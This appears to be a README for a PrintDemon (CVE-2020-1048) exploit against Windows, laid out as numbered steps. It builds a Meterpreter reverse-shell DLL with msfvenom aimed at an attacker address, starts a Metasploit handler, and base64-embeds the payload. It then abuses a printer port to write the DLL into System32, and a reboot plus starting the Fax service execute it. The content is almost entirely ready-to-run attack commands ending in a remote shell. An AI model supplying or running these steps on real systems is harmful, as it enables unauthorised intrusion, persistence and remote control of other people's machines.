## Steps

1. Meterpreter DLL
```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.100 lport=443 -f dll -o ualapi.dll
```
2. Run a handler
```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.1.100
set lport 443
```
3. Convert it to base64
```
cat ualapi.dll | base64 | tr -d '\n' > ualapi.txt
```
4. Fill base64 var in Program.cs line 50
5. Compile it
6. Create printer
```
$printer = "PrintDemon"
$PrinterDriver = "Generic / Text Only"
$printerPort = "C:\Windows\System32\Ualapi.dll"
Add-PrinterDriver -Name $PrinterDriver
Add-Printerport -name $printerPort
Add-Printer -Name $printer -DriverName $PrinterDriver -PortName $printerPort
```
7. Execute printdemon
```
PrintDemon.exe
```
8. Reboot the machine
9. Start fax service
```
sc.exe start Fax
```
10. Get the reverse shell

## References

- https://windows-internals.com/printdemon-cve-2020-1048/
- https://github.com/BC-SECURITY/Invoke-PrintDemon
- https://github.com/thalpius/PrintDemon
